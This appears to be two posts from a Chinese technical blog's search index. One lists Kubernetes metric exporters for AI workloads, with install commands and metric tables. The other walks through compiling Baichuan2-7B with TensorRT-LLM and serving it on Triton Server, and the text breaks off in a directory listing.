是华为自研的专门收集华为 NPU 各种监控信息和指标，并封装成 Prometheus 专用数据格式的一个服务组件。项目地址 https://github.com/Ascend/ascend-npu-exporter\n2.1 安装方式 1 kubectl apply -f https://raw.githubusercontent.com/shaowenchen/hubimage/main/observation/v5.0.RC3-npu-exporter.yaml 需要给 Huawei NPU 节点打上标签\n1 kubectl label node \u0026lt;node-name\u0026gt; accelerator/provider=huawei-npu 这里的 Container Runtime 为 Docker，如果是 Containerd 需要在启动参数中进行修改。\n2.2 指标 处理器信息 指标名称 单位 描述 machine_npu_nums 个 昇腾 AI 处理器数目。 网络信息 指标名称 单位 描述 npu_chip_info_bandwidth_rx MB/s 昇腾 AI 处理器网口实时接收速率（仅支持 Atlas 训练系列产品）。标签包含以下字段： npu_chip_info_bandwidth_tx MB/s 昇腾 AI 处理器网口实时发送速率（仅支持 Atlas 训练系列产品）。标签包含以下字段： npu_chip_info_link_status 1：UP, 0：DOWN 昇腾 AI 处理器网口 Link 状态（仅支持 Atlas 训练系列产品）。标签包含以下字段： npu_chip_info_network_status 1：健康, 0：不健康 昇腾 AI 处理器网络健康状态（仅支持 Atlas 训练系列产品）。标签包含以下字段： 错误和健康信息 指标名称 取值 描述 npu_chip_info_error_code 详见说明 昇腾 AI 处理器错误码。标签包含以下字段： 最后一列显示的-1，表示 DCMI 接口调用报错，可能是因为驱动异常导致；若为 0 表示没有错误码。错误码的详细信息请参见《Atlas A2 中心推理和训练硬件 黑匣子错误码信息列表》 npu_chip_info_name - 昇腾 AI 处理器名称和 ID。标签包含以下字段： npu_chip_info_health_status 1：健康, 0：不健康 昇腾 AI 处理器健康状态。标签包含以下字段： 性能信息 指标名称 单位 描述 npu_chip_info_power 瓦特（W） 昇腾 AI 处理器功耗（910 和 310 为处理器功耗，310P 为板卡功耗）。标签包含以下字段： npu_chip_info_temperature 摄氏度（℃） 昇腾 AI 处理器温度。标签包含以下字段： npu_chip_info_utilization % 昇腾 AI 处理器 AI Core 利用率。标签包含以下字段： npu_chip_info_aicore_current_freq MHz 昇腾 AI 处理器的 AI Core 当前频率。标签包含以下字段： 内存信息 指标名称 单位 描述 npu_chip_info_used_memory MB 昇腾 AI 处理器 DDR 内存已使用量。标签包含以下字段： npu_chip_info_total_memory MB 昇腾 AI 处理器 DDR 内存总量。标签包含以下字段： npu_chip_info_hbm_used_memory MB 昇腾 AI 处理器 HBM 内存已使用量（Atlas 训练系列产品专属）。标签包含以下字段： npu_chip_info_hbm_total_memory MB 昇腾 AI 处理器 HBM 总内存（Atlas 训练系列产品专属）。标签包含以下字段： container_npu_total_memory MB 带有容器信息的 NPU 内存总大小，只支持整卡。容器信息包含以下字段： container_npu_used_memory MB 带有容器信息的 NPU 已使用内存，只支持整卡。容器信息包含以下字段： vnpu_pod_total_memory KB vNPU 拥有的总内存：（仅 Atlas 推理系列产品支持） vnpu_pod_used_memory KB vNPU 使用中的内存：（仅 Atlas 推理系列产品支持） 容器和虚拟 NPU 信息 指标名称 单位 描述 npu_exporter_version_info - NPU-Exporter 版本信息。 npu_container_info - NPU 容器信息，输出包含以下字段： container_npu_total_memory MB 带有容器信息的 NPU 内存总大小，只支持整卡。容器信息包含以下字段： container_npu_used_memory MB 带有容器信息的 NPU 已使用内存，只支持整卡。容器信息包含以下字段： container_npu_utilization % 带有容器信息的 NPU 利用率，只支持整卡。容器信息包含以下字段： vnpu_pod_aicore_utilization % vNPU 的 AI Core 利用率：（仅 Atlas 推理系列产品支持） vnpu_pod_total_memory KB vNPU 拥有的总内存：（仅 Atlas 推理系列产品支持） vnpu_pod_used_memory KB vNPU 使用中的内存：（仅 Atlas 推理系列产品支持） 3. node-exporter node-exporter 是 Prometheus 开源的一个用于采集主机各项指标的工具。\n项目地址 https://github.com/prometheus/node_exporter\n3.1 安装方式 一般安装 Prometheus Server 时，默认已经安装 node-exporter，无需再次安装。\n添加 Helm 镜像仓库 1 helm repo add prometheus-community https://prometheus-community.github.io/helm-charts 1 helm repo update 安装 1 helm install prometheus-node-exporter prometheus-community/prometheus-node-exporter --namespace monitor --create-namespace 3.2 指标 以下是去掉分类列后的 Markdown 表格：\nCPU 指标名称 类型 描述 node_cpu_seconds_total Counter 节点 CPU 的使用时间 (单位：秒) 内存 指标名称 类型 描述 node_memory_MemTotal_bytes Gauge 节点总内存大小（单位：字节） node_memory_MemFree_bytes Gauge 节点空闲内存大小（单位：字节） node_memory_Buffers_bytes Gauge 节点缓存大小（单位：字节） node_memory_Cached_bytes Gauge 节点页面缓存大小（单位：字节） 磁盘 指标名称 类型 描述 node_filesystem_avail_bytes Gauge 分区用户剩余空间（单位：字节） node_filesystem_size_bytes Gauge 分区空间总容量（单位：字节） node_filesystem_free_bytes Gauge 分区物理剩余空间（单位：字节） node_disk_read_bytes_total Counter 分区读总字节数（单位：字节） node_disk_written_bytes_total Counter 分区写总字节数（单位：字节） node_disk_reads_completed_total Counter 分区读总次数 node_disk_writes_completed_total Counter 分区写总次数 网络 指标名称 类型 描述 node_network_receive_bytes_total Counter 接收流量总字节数（单位：字节） node_network_transmit_bytes_total Counter 发送流量总字节数（单位：字节） node_network_receive_packets_total Counter 接收流量总包数（单位：包） node_network_transmit_packets_total Counter 发送流量总包数（单位：包） node_network_receive_drop_total Counter 接收流量总丢包数（单位：包） node_network_transmit_drop_total Counter 发送流量总丢包数（单位：包） 4 node-problem-detector Node Problem Detector 简称 NPD，是 Kubernetes 开源的集群节点监控插件，用于节点故障检查。\n项目地址 https://github.com/kubernetes/node-problem-detector\n4.1 安装方式 添加 Helm 镜像仓库 1 helm repo add deliveryhero https://charts.deliveryhero.io/ 1 helm repo update 安装 1 helm install node-problem-detector deliveryhero/node-problem-detector --namespace monitor --create-namespace 4.2 指标 磁盘 指标名称 类型 描述 node_filesystem_avail_bytes Gauge 分区用户剩余空间（单位：字节） node_filesystem_size_bytes Gauge 分区空间总容量（单位：字节） node_filesystem_free_bytes Gauge 分区物理剩余空间（单位：字节） node_disk_read_bytes_total Counter 分区读总字节数（单位：字节） node_disk_written_bytes_total Counter 分区写总字节数（单位：字节） node_disk_reads_completed_total Counter 分区读总次数 node_disk_writes_completed_total Counter 分区写总次数 网络 指标名称 类型 描述 node_network_receive_bytes_total Counter 接收流量总字节数（单位：字节） node_network_transmit_bytes_total Counter 发送流量总字节数（单位：字节） node_network_receive_packets_total Counter 接收流量总包数（单位：包） node_network_transmit_packets_total Counter 发送流量总包数（单位：包） node_network_receive_drop_total Counter 接收流量总丢包数（单位：包） node_network_transmit_drop_total Counter 发送流量总丢包数（单位：包） CPU 指标名称 类型 描述 cpu_load_1m Gauge CPU 平均负载（1 分钟） cpu_load_5m Gauge CPU 平均负载（5 分钟） cpu_load_15m Gauge CPU 平均负载（15 分钟） cpu_runnable_task_count Gauge 平均运行任务数（过去一分钟） cpu_usage_time Counter CPU 使用时间（按状态分） 内存 指标名称 类型 描述 memory_bytes_used Gauge 内存使用量（按状态分） memory_anonymous_used Gauge 匿名内存使用量（按状态分） memory_dirty_used Gauge 脏页面内存使用量 memory_page_cache_used Gauge 页面缓存内存使用量（按状态分） memory_unevictable_used Gauge 不可清除内存使用量 系统 指标名称 类型 描述 host_uptime Gauge 操作系统运行时间 system_cpu_stat Counter CPU 不同状态的运行时间 system_interrupts_total Counter 总中断服务次数（累计） system_os_feature Gauge 操作系统特性开启状态 system_processes_total Counter 启动以来的进程总数（累计） system_procs_blocked Gauge 当前阻塞的进程数 system_procs_running Gauge 当前运行的进程数 问题计数 指标名称 类型 描述 problem_counter Counter 特定类型问题发生次数 问题状态 指标名称 类型 描述 problem_gauge Gauge 特定类型问题状态 5. process-exporter process-exporter 主要是用来监控主机上进程的状态，但非常可惜，已经很久没有更新了。\n项目地址 https://github.com/mumoshu/prometheus-process-exporter ，监控面板 https://grafana.com/grafana/dashboards/8378-system-processes-metrics/\n5.1 安装方式 安装 1 kubectl apply -f https://raw.githubusercontent.com/shaowenchen/hubimage/main/observation/process-exporter.yaml 指标配置方式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 apiVersion: v1 data: process-exporter.yaml: |- process_names: - name: \u0026#34;{{.Matches}}\u0026#34; cmdline: - \u0026#39;python\u0026#39; - name: \u0026#34;{{.Matches}}\u0026#34; cmdline: - \u0026#39;triton\u0026#39; kind: ConfigMap metadata: name: process-exporter-config namespace: monitor 匹配模板 描述 {{.Comm}} 包含原始可执行文件的名称，即/proc//stat {{.ExeBase}} 包含可执行文件的名称(默认) {{.ExeFull}} 包含可执行文件的路径 {{.Username}} 包含的用户名 {{.Matches}} 包含所有正则表达式而产生的匹配项（建议使用） {{.PID}} 包含进程的 PID，一个 PID 仅包含一个进程（不建议使用） {{.StartTime}} 包含进程的开始时间（不建议使用） 5.2 指标 指标名称 描述 namedprocess_namegroup_num_procs 运行的进程数 namedprocess_namegroup_states Running/Sleeping/Other/Zombie 状态的进程数 namedprocess_namegroup_cpu_seconds_total 获取/proc/[pid]/stat 进程 CPU utime、stime 状态时间 namedprocess_namegroup_read_bytes_total 获取/proc/[pid]/io 进程读取字节数 namedprocess_namegroup_write_bytes_total 获取/proc/[pid]/io 进程写入字节数 namedprocess_namegroup_memory_bytes 获取进程使用的内存字节数 namedprocess_namegroup_open_filedesc 获取进程使用的文件描述符数量 namedprocess_namegroup_thread_count 运行的线程数 namedprocess_namegroup_thread_cpu_seconds_total 获取线程 CPU 状态时间 namedprocess_namegroup_thread_io_bytes_total 获取线程 IO 字节数 6. nvidia gpu exporter nvidia gpu exporter 是一个通过 nvidia-smi 获取 GPU 指标的工具\n项目地址 https://github.com/utkuozdemir/nvidia_gpu_exporter ，面板地址 https://grafana.com/grafana/dashboards/14574-nvidia-gpu-metrics/\n6.1 安装方式 添加 Helm 镜像仓库 1 helm repo add utkuozdemir https://utkuozdemir.org/helm-charts 1 helm repo update 安装 1 2 3 4 helm install nvidia-gpu-exporter utkuozdemir/nvidia-gpu-exporter \\ --namespace monitor --create-namespace \\ --set nodeSelector.\u0026#34;accelerator\\/provider\u0026#34;=nvidia-gpu \\ --set serviceMonitor.enabled=false 需要给 NVIDIA GPU 节点打上标签\n1 kubectl label node \u0026lt;node-name\u0026gt; accelerator/provider=nvidia-gpu 6.2 指标 指标名称 类型 单位 描述 nvidia_smi_accounting_buffer_size gauge 计费缓冲区大小 nvidia_smi_accounting_mode gauge 计费模式 nvidia_smi_clocks_applications_graphics_clock_hz gauge MHz 应用程序显卡时钟频率 nvidia_smi_clocks_applications_memory_clock_hz gauge MHz 应用程序内存时钟频率 nvidia_smi_clocks_current_graphics_clock_hz gauge MHz 当前显卡时钟频率 nvidia_smi_clocks_current_memory_clock_hz gauge MHz 当前内存时钟频率 nvidia_smi_clocks_current_sm_clock_hz gauge MHz 当前流处理器时钟频率 nvidia_smi_clocks_current_video_clock_hz gauge MHz 当前视频时钟频率 nvidia_smi_clocks_default_applications_graphics_clock_hz gauge MHz 默认应用程序显卡时钟频率 nvidia_smi_clocks_default_applications_memory_clock_hz gauge MHz 默认应用程序内存时钟频率 nvidia_smi_clocks_max_graphics_clock_hz gauge MHz 最大显卡时钟频率 nvidia_smi_clocks_max_memory_clock_hz gauge MHz 最大内存时钟频率 nvidia_smi_clocks_max_sm_clock_hz gauge MHz 最大流处理器时钟频率 nvidia_smi_clocks_throttle_reasons_active gauge 主动限制原因 nvidia_smi_clocks_throttle_reasons_applications_clocks_setting gauge 应用程序时钟设置限制原因 nvidia_smi_clocks_throttle_reasons_gpu_idle gauge GPU 空闲限制原因 nvidia_smi_clocks_throttle_reasons_hw_power_brake_slowdown gauge 硬件动力制动减速限制原因 nvidia_smi_clocks_throttle_reasons_hw_slowdown gauge 硬件减速限制原因 nvidia_smi_clocks_throttle_reasons_hw_thermal_slowdown gauge 硬件温控减速限制原因 nvidia_smi_clocks_throttle_reasons_supported gauge 支持的限制原因 nvidia_smi_clocks_throttle_reasons_sw_power_cap gauge 软件功率上限限制原因 nvidia_smi_clocks_throttle_reasons_sw_thermal_slowdown gauge 软件温控减速限制原因 nvidia_smi_clocks_throttle_reasons_sync_boost gauge 同步增强限制原因 nvidia_smi_command_exit_code gauge 最后一次抓取命令的退出码 nvidia_smi_compute_cap gauge 计算能力 nvidia_smi_compute_mode gauge 计算模式 nvidia_smi_count gauge 数量 nvidia_smi_display_active gauge 显示器激活状态 nvidia_smi_display_mode gauge 显示器模式 nvidia_smi_ecc_errors_corrected_aggregate_device_memory gauge 修正的设备内存 ECC 错误总数 nvidia_smi_ecc_errors_corrected_aggregate_dram gauge 修正的 DRAM ECC 错误总数 nvidia_smi_ecc_errors_corrected_aggregate_total gauge 修正的 ECC 错误总数 nvidia_smi_ecc_errors_corrected_volatile_device_memory gauge 修正的易失性设备内存 ECC 错误数 nvidia_smi_ecc_errors_corrected_volatile_dram gauge 修正的易失性 DRAM ECC 错误数 nvidia_smi_ecc_errors_corrected_volatile_total gauge 修正的易失性 ECC 错误总数 nvidia_smi_ecc_errors_uncorrected_aggregate_device_memory gauge 未修正的设备内存 ECC 错误总数 nvidia_smi_ecc_errors_uncorrected_aggregate_dram gauge 未修正的 DRAM ECC 错误总数 nvidia_smi_ecc_errors_uncorrected_aggregate_total gauge 未修正的 ECC 错误总数 nvidia_smi_ecc_errors_uncorrected_volatile_device_memory gauge 未修正的易失性设备内存 ECC 错误数 nvidia_smi_ecc_errors_uncorrected_volatile_dram gauge 未修正的易失性 DRAM ECC 错误数 nvidia_smi_ecc_errors_uncorrected_volatile_total gauge 未修正的易失性 ECC 错误总数 nvidia_smi_ecc_mode_current gauge 当前 ECC 模式 nvidia_smi_ecc_mode_pending gauge 等待生效的 ECC 模式 nvidia_smi_encoder_stats_average_fps gauge 编码器平均 FPS nvidia_smi_encoder_stats_average_latency gauge 编码器平均延迟 nvidia_smi_encoder_stats_session_count gauge 编码会话数 nvidia_smi_enforced_power_limit_watts gauge W 执行的功率限制 nvidia_smi_gpu_info gauge GPU 信息 nvidia_smi_index gauge 索引 nvidia_smi_inforom_ecc gauge ECC 信息 ROM nvidia_smi_inforom_oem gauge OEM 信息 ROM nvidia_smi_memory_free_bytes gauge MiB 空闲内存 nvidia_smi_memory_reserved_bytes gauge MiB 保留内存 nvidia_smi_memory_total_bytes gauge MiB 总内存 nvidia_smi_memory_used_bytes gauge MiB 已用内存 nvidia_smi_name gauge 名称 nvidia_smi_pci_bus gauge PCI 总线号 nvidia_smi_pci_device gauge PCI 设备号 nvidia_smi_pci_device_id gauge PCI 设备 ID nvidia_smi_pci_domain gauge PCI 域 nvidia_smi_pci_sub_device_id gauge PCI 子设备 ID nvidia_smi_pcie_link_gen_current gauge 当前 PCIe 链路生成 nvidia_smi_pcie_link_gen_gpucurrent gauge GPU 当前 PCIe 链路生成 nvidia_smi_pcie_link_gen_gpumax gauge GPU 最大 PCIe 链路生成 nvidia_smi_pcie_link_gen_hostmax gauge 主机最大 PCIe 链路生成 nvidia_smi_pcie_link_gen_max gauge 最大 PCIe 链路生成 nvidia_smi_pcie_link_width_current gauge 当前 PCIe 链路带宽 nvidia_smi_pcie_link_width_max gauge 7. juicefs-exporter 在主机上挂载 JuiceFS 文件系统时，默认在 9567 端口就有 Metrics 数据。\n面板地址 https://github.com/juicedata/juicefs/blob/be5b6935975ea665c37f9cf5f5827e6f9474e28f/docs/en/grafana_template.json\n7.1 安装方式 1 kubectl apply -f https://raw.githubusercontent.com/shaowenchen/hubimage/main/observation/host-9567-expoorter.yaml 7.2 指标 文件系统 指标名称 描述 单位 juicefs_used_space 总使用空间 字节 juicefs_used_inodes 总 inodes 数量 操作系统 指标名称 描述 单位 juicefs_uptime 总运行时间 秒 juicefs_cpu_usage CPU 使用量 秒 juicefs_memory 内存使用量 字节 元数据引擎 指标名称 描述 单位 juicefs_transaction_durations_histogram_seconds 事务的延时分布 秒 juicefs_transaction_restart 事务重启的次数 FUSE 指标名称 描述 单位 juicefs_fuse_read_size_bytes 读请求的大小分布 字节 juicefs_fuse_written_size_bytes 写请求的大小分布 字节 juicefs_fuse_ops_durations_histogram_seconds 所有请求的延时分布 秒 juicefs_fuse_open_handlers 打开的文件和目录数量 SDK 指标名称 描述 单位 juicefs_sdk_read_size_bytes 读请求的大小分布 字节 juicefs_sdk_written_size_bytes 写请求的大小分布 字节 juicefs_sdk_ops_durations_histogram_seconds 所有请求的延时分布 秒 缓存 指标名称 描述 单位 juicefs_blockcache_blocks 缓存块的总个数 juicefs_blockcache_bytes 缓存块的总大小 字节 juicefs_blockcache_hits 命中缓存块的总次数 juicefs_blockcache_miss 没有命中缓存块的总次数 juicefs_blockcache_writes 写入缓存块的总次数 juicefs_blockcache_drops 丢弃缓存块的总次数 juicefs_blockcache_evicts 淘汰缓存块的总次数 juicefs_blockcache_hit_bytes 命中缓存块的总大小 字节 juicefs_blockcache_miss_bytes 没有命中缓存块的总大小 字节 juicefs_blockcache_write_bytes 写入缓存块的总大小 字节 juicefs_blockcache_read_hist_seconds 读缓存块的延时分布 秒 juicefs_blockcache_write_hist_seconds 写缓存块的延时分布 秒 juicefs_staging_blocks 暂存路径中的块数 juicefs_staging_block_bytes 暂存路径中块的总字节数 秒 juicefs_staging_block_delay_seconds 暂存块延迟的总秒数 秒 对象存储 指标名称 描述 单位 juicefs_object_request_durations_histogram_seconds 请求对象存储的延时分布 秒 juicefs_object_request_errors 请求失败的总次数 juicefs_object_request_data_bytes 请求对象存储的总数据大小 字节 内部特性 指标名称 描述 单位 juicefs_compact_size_histogram_bytes 合并数据的大小分布 字节 juicefs_used_read_buffer_size_bytes 当前用于读取的缓冲区的大小 数据同步 指标名称 描述 单位 juicefs_sync_scanned 从源端扫描的所有对象数量 juicefs_sync_handled 已经处理过的来自源端的对象数量 juicefs_sync_pending 等待同步的对象数量 juicefs_sync_copied 已经同步过的对象数量 juicefs_sync_copied_bytes 已经同步过的数据总大小 字节 juicefs_sync_skipped 同步时被跳过的对象数量 juicefs_sync_failed 同步时失败的对象数量 juicefs_sync_deleted 同步时被删除的对象数量 juicefs_sync_checked 同步时校验过 checksum 的对象数量 juicefs_sync_checked_bytes 同步时校验过 checksum 的数据总大小 字节 8. kube-state-metrics kube-state-metrics 通过监听 Kubernetes API 服务器来生成不同资源的状态的 Metrics 数据。\n项目地址 https://github.com/kubernetes/kube-state-metrics ，监控面板 https://grafana.com/grafana/dashboards/13332-kube-state-metrics-v2/ 。\n8.1 安装方式 一般安装 Prometheus Server 时，默认已经安装 kube-state-metrics，无需再次安装。\n1 kubectl apply -f https://raw.githubusercontent.com/shaowenchen/hubimage/main/observation/v2.10.0-kube-state-metrics.yaml 8.2 指标 Node 指标名称 类型 描述 kube_node_info Gauge 查询集群内所有的节点信息,可以通过 sum() 函数获得集群中的所有节点数目。 kube_node_spec_unschedulable Gauge 查询节点是否可以被调度新的 Pod。可以通过 sum() 函数获得集群中可以调度的 Pod 总数。 kube_node_status_allocatable Gauge 查询节点可用于调度的资源总数。包括:CPU、内存、Pods 等。允许通过标签筛选,查看节点具体的资源容量。 kube_node_status_capacity Gauge 查询节点的全部资源总数,包括:CPU、内存、Pods 等。允许通过标签筛选,查看节点具体的资源容量。 kube_node_status_condition Gauge 查询节点的状态,可以基于 OutOfDisk、MemoryPressure、DiskPressure 等状态找到状态不正常的节点。 Pod 指标名称 类型 描述 kube_pod_info Gauge 查询所有的 Pod 信息,可以通过 sum() 函数获得集群中的所有 Pod 数目。 kube_pod_status_phase Gauge 查询所有的 Pod 启动状态。状态包括:\n_ True:启动成功。\n_ Failed:启动失败。\n* Unknown:状态未知。 kube_pod_status_ready Gauge 查询所有处于 Ready 状态的 Pod。可以通过 sum() 函数获得集群中的所有 Pod 数目。 kube_pod_status_scheduled Gauge 查询所有处于 scheduled 状态的 Pod。可以通过 sum() 函数获得集群中的所有 Pod 数目。 Container 指标名称 类型 描述 kube_pod_container_info Gauge 查询所有 Container 的信息。可以通过 sum() 函数获得集群中的所有 Container 数目。 kube_pod_container_status_ready Gauge 查询所有状态为 Ready 的 Container 信息。可以通过 sum() 函数获得集群中的所有 Container 数目。 kube_pod_container_status_restarts_total Count 查询集群中所有 Container 的重启累计次数。可以通过 irate() 函数获得集群中 Container 的重启率。 kube_pod_container_status_running Gauge 查询所有状态为 Running 的 Container 信息。可以通过 sum() 函数获得集群中的所有 Container 数目。 kube_pod_container_status_terminated Gauge 查询所有状态为 Terminated 的 Container 信息。可以通过 sum() 函数获得集群中的所有 Container 数目。 kube_pod_container_status_waiting Gauge 查询所有状态为 Waiting 的 Container 信息。可以通过 sum() 函数获得集群中的所有 Container 数目。 kube_pod_container_resource_requests Gauge 查询容器的资源需求量。允许通过标签筛选,查看容器具体的资源需求量。 kube_pod_container_resource_limits Gauge 查询容器的资源限制量。允许通过标签筛选,查看容器具体的资源限制量。 ","description":"","id":71,"section":"post","tags":["博文","Kubernetes","AI","指标","采集"],"title":"Kubernetes 集群中 AI 相关的采集器","uri":"https://www.chenshaowen.com/blog/ai-related-exporters-in-kubernetes.html"},{"content":"1. TensorRT-LLM 编译模型 1.1 TensorRT-LLM 简介 使用 TensorRT 时，通常需要将模型转换为 ONNX 格式，再将 ONNX 转换为 TensorRT 格式，然后在 TensorRT、Triton Server 中进行推理。\n但这个转换过程并不简单，经常会遇到各种报错，需要对模型结构、平台算子有一定的掌握，具备转换和调试能力。而 TensorRT-LLM 的目标就是降低这一过程的复杂度，让大模型更容易跑在 TensorRT 引擎上。\n需要注意的是，TensorRT 针对的是具体硬件，不同的 GPU 型号需要编译不同的 TensorRT 格式模型。这与 ONNX 模型格式的通用性定位显著不同。\n同时，TensortRT-LLM 并不支持全部 GPU 型号，仅支持 H100、L40S、A100、A30、V100 等显卡。\n1.2 配置编译环境 1 docker run --gpus device=0 -v $PWD:/app/tensorrt_llm/models -it --rm hubimage/nvidia-tensorrt-llm:v0.7.1 bash --gpus device=0 表示使用编号为 0 的 GPU 卡，这里的 hubimage/nvidia-tensorrt-llm:v0.7.1 对应的就是 TensorRT-LLM v0.7.1 的 Release 版本。\n由于自行打镜像非常麻烦，这里提供几个可选版本的镜像:\nhubimage/nvidia-tensorrt-llm:v0.7.1 hubimage/nvidia-tensorrt-llm:v0.7.0 hubimage/nvidia-tensorrt-llm:v0.6.1 1.3 编译生成 TensorRT 格式模型 在上述容器环境下，执行命令:\n1 2 3 4 5 6 7 8 9 python examples/baichuan/build.py --model_version v2_7b \\ --model_dir ./models/Baichuan2-7B-Chat \\ --dtype float16 \\ --parallel_build \\ --use_inflight_batching \\ --enable_context_fmha \\ --use_gemm_plugin float16 \\ --use_gpt_attention_plugin float16 \\ --output_dir ./models/Baichuan2-7B-trt-engines 生成的文件主要有三个:\nbaichuan_float16_tp1_rank0.engine，嵌入权重的模型计算图文件 config.json，模型结构、精度、插件等详细配置信息文件 model.cache，编译缓存文件，可以加速后续编译速度 1.4 推理测试 1 2 3 4 python examples/run.py --input_text \u0026#34;世界上第二高的山峰是哪座？\u0026#34; \\ --max_output_len=200 \\ --tokenizer_dir ./models/Baichuan2-7B-Chat \\ --engine_dir=./models/Baichuan2-7B-trt-engines 1 2 3 4 [02/03/2024-10:02:58] [TRT-LLM] [W] Found pynvml==11.4.1. Please use pynvml\u0026gt;=11.5.0 to get accurate memory usage Input [Text 0]: \u0026#34;世界上第二高的山峰是哪座？\u0026#34; Output [Text 0 Beam 0]: \u0026#34; 珠穆朗玛峰（Mount Everest）是地球上最高的山峰，海拔高度为8,848米（29,029英尺）。第二高的山峰是喀喇昆仑山脉的乔戈里峰（K2），海拔高度为8,611米（28,251英尺）。\u0026#34; 1.5 验证是否严重退化 模型推理优化，可以替换算子、量化、裁剪反向传播等手段，但有一个基本线一定要达到，那就是模型不能退化很多。\n在精度损失可接受的范围内，模型的推理优化才有意义。TensorRT-LLM 项目提供的 summarize.py 可以跑一些测试，给模型打分，rouge1、rouge2 和 rougeLsum 是用于评价文本生成质量的指标，可以用于评估模型推理质量。\n获取原格式模型的 Rouge 指标 1 pip install datasets nltk rouge_score -i https://pypi.tuna.tsinghua.edu.cn/simple 由于目前 optimum 不支持 Baichuan 模型，因此，需要编辑 examples/summarize.py 注释掉 model.to_bettertransformer()，这个问题在最新的 TensorRT-LLM 代码中已经解决，我使用的是当前最新的 Release 版本 （v0.7.1）。\n1 2 3 4 python examples/summarize.py --test_hf \\ --hf_model_dir ./models/Baichuan2-7B-Chat \\ --data_type fp16 \\ --engine_dir ./models/Baichuan2-7B-trt-engines 输出结果:\n1 2 3 4 5 6 [02/03/2024-10:21:45] [TRT-LLM] [I] Hugging Face (total latency: 31.27020287513733 sec) [02/03/2024-10:21:45] [TRT-LLM] [I] HF beam 0 result [02/03/2024-10:21:45] [TRT-LLM] [I] rouge1 : 28.847385241217726 [02/03/2024-10:21:45] [TRT-LLM] [I] rouge2 : 9.519352831698162 [02/03/2024-10:21:45] [TRT-LLM] [I] rougeL : 20.85486489462602 [02/03/2024-10:21:45] [TRT-LLM] [I] rougeLsum : 24.090111126907733 获取 TensorRT 格式模型的 Rouge 指标 1 2 3 4 python examples/summarize.py --test_trt_llm \\ --hf_model_dir ./models/Baichuan2-7B-Chat \\ --data_type fp16 \\ --engine_dir ./models/Baichuan2-7B-trt-engines 输出结果:\n1 2 3 4 5 6 [02/03/2024-10:23:16] [TRT-LLM] [I] TensorRT-LLM (total latency: 28.360705375671387 sec) [02/03/2024-10:23:16] [TRT-LLM] [I] TensorRT-LLM beam 0 result [02/03/2024-10:23:16] [TRT-LLM] [I] rouge1 : 26.557043897453102 [02/03/2024-10:23:16] [TRT-LLM] [I] rouge2 : 8.28672928021811 [02/03/2024-10:23:16] [TRT-LLM] [I] rougeL : 19.13639628365737 [02/03/2024-10:23:16] [TRT-LLM] [I] rougeLsum : 22.0436013250798 TensorRT-LLM 编译之后的模型，rougeLsum 从 24 降到了 22，说明能力会有退化，但只要在可接受的范围之内，还是可以使用的，因为推理速度会有较大的提升。\n完成这步之后，就可以退出容器了，推理是在另外一个容器中进行。\n2. Triton Server 配置说明 2.1 Triton Server 简介 Triton Server 是一个推理框架，提供用户规模化进行推理的能力。具体包括:\n支持多种后端，tensorrt、onnxruntime、pytorch、python、vllm、tensorrtllm 等，还可以自定义后端，只需要相应的 shared library 即可。 对外提供 HTTP、GRPC 接口 batch 能力，支持批量进行推理，而开启 Dynamic batching 之后，多个 batch 可以合并之后同时进行推理，实现更高吞吐量 pipeline 能力，一个 Triton Server 可以同时推理多个模型，并且模型之间可以进行编排，支持 Concurrent Model Execution 流水线并行推理 观测能力，提供有 Metrics 可以实时监控推理的各种指标 上面是 Triton Server 的架构图，简单点说 Triton Server 是一个端（模型）到端（应用）的推理框架，提供了围绕推理的生命周期过程管理，配置好模型之后，就能直接对应用层提供服务。\n2.2 Triton Server 使用配置 在 Triton 社区的示例中，通常会有这样四个目录:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 . ├── ensemble │ ├── 1 │ └── config.pbtxt ├── postprocessing │ ├── 1 │ │ └── model.py │ └── config.pbtxt ├── preprocessing │ ├── 1 │ │ └── model.py │ └── config.pbtxt └── tensorrt_llm ├── 1 └── config.pbtxt 9 directories, 6 files 对于 Triton Server 来说，上面的目录格式实际上是定义了四个模型，分别是 preprocessing、tensorrt_llm、postprocessing、ensemble，只不过 ensemble 是一个组合模型，定义多个模型来融合。\nensemble 存在的原因在于 tensorrt_llm 的推理并不是 text2text ，借助 Triton Server 的 Pipeline 能力，通过 preprocessing 对输入进行 Tokenizing，postprocessing 对输出进行 Detokenizing，就能够实现端到端的推理能力。否则，在客户端直接使用 TensorRT-LLM 时，还需要自行处理词与索引的双向映射。\n这四个模型具体作用如下:\npreprocessing, 用于输入文本的预处理，包括分词、词向量化等，实现类似 text2vec 的预处理。\ntensorrt_llm, 用于 TensorRT 格式模型的 vec2vec 的推理\npostprocessing，用于输出文本的后处理，包括生成文本的后处理，如对齐、截断等，实现类似 vec2text 的后处理。\nensemble，将上面的是三个模型进行融合，提供 text2text 的推理\n上面定义的模型都有一个 1 目录表示版本 1 ，在版本目录中放置模型文件，在模型目录下放置 config.pbtxt 描述推理的参数 input、output、version 等。\n2.3 模型加载的控制管理 Triton Server 通过参数 --model-control-mode 来控制模型加载的方式，目前有三种加载模式:\nnone，加载目录下的全部模型 explicit，加载目录下的指定模型，通过参数 --load-model 加载指定的模型 poll，定时轮询加载目录下的全部模型，通过参数 --repository-poll-secs 配置轮询周期 2.4 模型版本的控制管理 Triton Server 在模型的配置文件 config.pbtxt 中提供有 Version Policy，每个模型可以有多个版本共存。默认使用版本号为 1 的模型，目前有三种版本策略:\n所有版本同时使用 version_policy: { all: {}} 只使用最近 n 个版本 version_policy: { latest: { num_versions: 3}} 只使用指定的版本 version_policy: { specific: { versions: [1, 3, 5]}} 3. Triton Server 中使用 TensorRT-LLM 3.1 克隆配置文件 本文示例相关的配置已经整理了一份到 GitHub 上，拷贝模型到指定的目之后，就可以直接进行推理了。\n1 git clone https://github.com/shaowenchen/modelops 3.2 组织推理目录 拷贝 TensorRT 格式模型 1 cp Baichuan2-7B-trt-engines/* modelops/triton-tensorrtllm/Baichuan2-7B-Chat/tensorrt_llm/1/ 拷贝源模型 1 cp -r Baichuan2-7B-Chat modelops/triton-tensorrtllm/downloads 此时文件的目录结构是:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 tree modelops/triton-tensorrtllm modelops/triton-tensorrtllm ├── Baichuan2-7B-Chat │ ├── end_to_end_grpc_client.py │ ├── ensemble │ │ ├── 1 │ │ └── config.pbtxt │ ├── postprocessing │ │ ├── 1 │ │ │ ├── model.py │ │ │ └── __pycache__ │ │ │ └── model.cpython-310.pyc 